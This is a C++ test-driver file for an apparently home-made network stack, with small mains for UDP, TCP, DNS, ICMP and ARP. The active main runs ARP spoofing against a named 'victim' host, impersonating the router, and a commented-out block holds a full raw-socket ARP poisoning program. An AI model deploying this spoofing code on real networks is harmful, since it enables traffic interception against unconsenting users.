#include <iostream>
#include <vector>
#include <linux/if_ether.h>

#include "linux/tcp/tcp_conn_client.h"
#include "linux/udp/udp_conn_client.h"
#include "linux/dns/dns_client.h"
#include "linux/ip4/ip4_conn_client.h"
#include "linux/icmp/icmp_conn_client.h"
#include "linux/ether/ethernet_conn_client.h"
#include "linux/ether/arp_conn_client.h"

#include "abstract/basic_gateway.h"
#include "abstract/basic_encapsulating_client.h"

#define IP "127.0.0.1"
#define PORT 4444

int udp_main() {

    ip4_conn_client ip_client(IP);
    ip_client.register_handler(IPPROTO_UDP);

    udp_conn_client client(PORT);
    client.ip_client = &ip_client;

    std::cout << "sending data" << std::endl;
    char *msg = "first";
    int len = strlen(msg);
//    cout << "sent " << client.send_data(msg, len) << " bytes" << endl;
    client.send_data(msg, len);
    cout << "sent bytes" << endl;

    char buff[6];
    memset(buff, '\x00', 6);
//    client.recv_data(buff, 5);
    client.recv_data(buff, 5); // first one actually captures this client's message, and ignores it
    client.recv_data(buff, 5);
    cout << "server: " << buff << endl;


    std::cout << "sending data" << std::endl;
    char *msg2 = "secnd";
    int len2 = strlen(msg2);
//    cout << "sent " << client.send_data(msg2, len2) << " bytes" << endl;
    client.send_data(msg2, len2);
    cout << "sent bytes" << endl;

    char buff2[6];
    memset(buff2, '\x00', 6);
//    client.recv_data(buff2, 5);
    client.recv_data(buff2, 5); // first one actually captures this client's message, and ignores it
    client.recv_data(buff2, 5);
    cout << "server: " << buff2 << endl;

    while (true) {

    }

    return 0;
}

int tcp_main() {
    std::cout << "Hello, World!" << std::endl;

    tcp_conn_client client(IP, PORT);
    client.conn();

    std::cout << "sending data" << std::endl;
    char *msg = "hello";
    cout << "sent " << client.send_data(msg, strlen(msg)) << " bytes" << endl;
    std::cout << "data sent" << std::endl;

    char buff[6];
    memset(buff, '\x00', 6);
    client.recv_data(buff, 5);
    cout << "server: " << buff << endl;


    std::cout << "sending data" << std::endl;
    char *msg2 = "secnd";
    cout << "sent " << client.send_data(msg2, strlen(msg2)) << " bytes" << endl;
    std::cout << "data sent" << std::endl;

    char buff2[6];
    memset(buff2, '\x00', 6);
    client.recv_data(buff2, 5);
    cout << "server: " << buff2 << endl;

    while (true) {

    }

    return 0;
}

int dns_main() {
    vector<string> hosts = {
            "wiki.osdev.org",
            "www.wix.com",
            "docs.google.com",
            "www.scs.stanford.edu",
            "yahho.com",
            "google.com",
            "youtube.com",
            "tradingview.com",
            "walla.co.il",
            "nasa.com",
            "medium.com",
    };

    ip4_conn_client ip_client("8.8.8.8");
    ip_client.register_handler(IPPROTO_UDP);

    udp_conn_client udp_client(DNS_PORT);
    udp_client.ip_client = &ip_client;

    dns_client dns_client;
    dns_client.udp_client = &udp_client;

    for (string &str: hosts)
        dns_client.query(str);

    return 0;
}

int icmp_main() {
    char *str = "172.217.22.46";
//    char* str = "google.com";

    ip4_conn_client ip_client(str);
    ip_client.register_handler(IPPROTO_ICMP);

    icmp_conn_client icmp_client;
    icmp_client.ip_client = &ip_client;

    icmp_client.ping();
}

int arp_main() {

    ethernet_conn_client ether_client;

    arp_conn_client arp_client;
    arp_client.ether_client = &ether_client;


    string victim = "10.100.102.15";
    vector<pair<mac_addr, string>> victim_list = {
            {arp_client.search_for_device(victim),victim}
    };
    arp_client.spoof_as_device("10.100.102.1", // router
                               victim_list);

}

int main() {
//    udp_main();
//    tcp_main();
//    dns_main();
//    icmp_main();
    arp_main();
}


//#include <stdio.h>
//#include <stdlib.h>
//#include <string.h>
//#include <unistd.h>
//#include <arpa/inet.h>
//#include <net/if.h>
//#include <sys/socket.h>
//#include <netpacket/packet.h>
//#include <net/ethernet.h>
//#include <netinet/if_ether.h>
//#include <signal.h>
//
//#define IP4LEN 4
//
//int
//main(int argc, char **argv) {
//
//
////    if (argc < 4) {
////        puts("usage:\t./arp_header-poison <INTERFACE> <gateway ip> <mac addr>");
////        puts("ex:\t./arp_header-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
////        exit(1);
////    }
//
//    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
//    if (sock < 0)
//        perror("socket"), exit(1);
//
//    char *INTERFACE = "enp0s3";
//    char *ip = "10.0.0.1";
//    char *mac = "aa:bb:cc:dd:ee:ff";
//
//#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
//    char packet[PKTLEN];
//    memset(packet, 0, PKTLEN);
//
//    struct ether_header *eth_header = (struct ether_header *) packet; // ethernet header
//    struct ether_arp *arp_header = (struct ether_arp *) (packet + sizeof(struct ether_header)); // arp_header header
//
//
//    // setup arp header
//    sscanf(mac, "%x:%x:%x:%x:%x:%x", (unsigned int *) &arp_header->arp_sha[0],
//           (unsigned int *) &arp_header->arp_sha[1],
//           (unsigned int *) &arp_header->arp_sha[2],
//           (unsigned int *) &arp_header->arp_sha[3],
//           (unsigned int *) &arp_header->arp_sha[4],
//           (unsigned int *) &arp_header->arp_sha[5]);
//
//    sscanf(ip, "%d.%d.%d.%d", (int *) &arp_header->arp_spa[0],
//           (int *) &arp_header->arp_spa[1],
//           (int *) &arp_header->arp_spa[2],
//           (int *) &arp_header->arp_spa[3]);
//
//
//    // setup ethernet header
//    memset(eth_header->ether_dhost, 0xff, ETH_ALEN); // send to broadcast
//    memcpy(eth_header->ether_shost, arp_header->arp_sha, ETH_ALEN);
//    eth_header->ether_type = htons(ETH_P_ARP); // ethertype: arp
//
//
//    // setup arp header
//    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
//    arp_header->ea_hdr.ar_pro = htons(ETH_P_IP); // first arp addr type: ip
//    arp_header->ea_hdr.ar_hln = ETH_ALEN; // len of mac addr
//    arp_header->ea_hdr.ar_pln = IP4LEN; // len of ip addr
//    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY); // type of arp (forged reply)
//    memset(arp_header->arp_tha, 0xff, ETH_ALEN);
//    memset(arp_header->arp_tpa, 0x00, IP4LEN);
//
//
//    struct sockaddr_ll interface_addr;
//    memset(&interface_addr, 0, sizeof(interface_addr));
//    interface_addr.sll_ifindex = if_nametoindex(INTERFACE);
//    interface_addr.sll_family = AF_PACKET;
//    memcpy(interface_addr.sll_addr, arp_header->arp_sha, ETH_ALEN);
//    interface_addr.sll_halen = htons(ETH_ALEN);
//
//    while (1) {
//        printf("%s: %s is at %s\n", INTERFACE, ip, mac);
//        cout << "sent" << endl;
//        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &interface_addr, sizeof(interface_addr));
//        sleep(1);
//    }
//    return 0;
//}